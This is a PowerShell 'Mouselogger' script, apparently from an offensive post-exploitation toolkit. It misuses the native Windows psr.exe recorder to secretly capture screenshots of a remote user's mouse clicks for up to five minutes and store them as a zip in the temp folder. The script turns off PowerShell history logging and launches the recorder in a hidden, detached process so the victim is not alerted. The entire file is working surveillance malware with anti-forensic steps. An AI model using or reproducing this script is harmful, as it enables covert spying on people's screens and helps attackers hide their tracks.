<#
.SYNOPSIS
   Capture screenshots of MouseClicks for 'xx' Seconds

   Author: r00t-3xp10it
   Tested Under: Windows 10 (18363) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.0.1

.DESCRIPTION
   This script allow users to Capture Screenshots of 'MouseClicks'
   with the help of psr.exe native windows 10 (error report service).
   Remark: Capture will be stored under '`$Env:TMP' remote directory.
   'Min capture time its 8 secs the max is 300 and 100 screenshots'.

.NOTES
   Required Dependencies: psr.exe {native}

.Parameter Mouselogger
   Accepts argument: Start

.Parameter Timmer
   Accepts the capture time (in seconds) 

.EXAMPLE
   PS C:\> .\Mouselogger.ps1 -Mouselogger Start
   Capture Screenshots of Mouse Clicks for 10 secs {default}

.EXAMPLE
   PS C:\> .\Mouselogger.ps1 -Mouselogger Start -Timmer 28
   Capture Screenshots of remote Mouse Clicks for 28 seconds

.OUTPUTS
   Capture     Timmer      Storage                                          
   -------     ------      -------                                          
   MouseClicks for 10(sec) C:\Users\pedro\AppData\Local\Temp\SHot-zcsV03.zip
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$Mouselogger="false",
   [int]$Timmer='10'
)


Write-Host ""
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($Mouselogger -ieq "Start"){
## Random FileName generation
$Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 6 |%{[char]$_})
$CaptureFile = "$Env:TMP\SHot-" + "$Rand.zip" ## Capture File Name
If($Timmer -lt '10' -or $Timmer -gt '300'){$Timmer = '10'}
## Set the max\min capture time value
# Remark: The max capture time its 300 secs {5 minuts}

    ## Make sure psr.exe (LolBin) exists on remote host
    If(Test-Path "$Env:WINDIR\System32\psr.exe"){

        ## Create Data Table for output
        $mytable = New-Object System.Data.DataTable
        $mytable.Columns.Add("Capture")|Out-Null
        $mytable.Columns.Add("Timmer")|Out-Null
        $mytable.Columns.Add("Storage")|Out-Null
        $mytable.Rows.Add("MouseClicks",
                          "for $Timmer(sec)",
                          "$CaptureFile")|Out-Null

        ## Display Data Table
        $mytable|Format-Table -AutoSize > $Env:TMP\MyTable.log
        Get-Content -Path "$Env:TMP\MyTable.log"
        Remove-Item -Path "$Env:TMP\MyTable.log" -Force

        ## Start psr.exe (-WindowStyle hidden) process detach (orphan) from parent process
        Start-Process -WindowStyle hidden powershell -ArgumentList "psr.exe", "/start", "/output $CaptureFile", "/sc 1", "/maxsc 100", "/gui 0;", "Start-Sleep -Seconds $Timmer;", "psr.exe /stop" -ErrorAction SilentlyContinue|Out-Null
    }Else{
        ## PSR.exe (error report service) not found in current system ..
        write-host "[fail] Not found: $Env:WINDIR\System32\psr.exe" -ForeGroundColor Red -BackgroundColor Black
        Start-Sleep -Seconds 1
    }
    Write-Host "";Start-Sleep -Seconds 1
}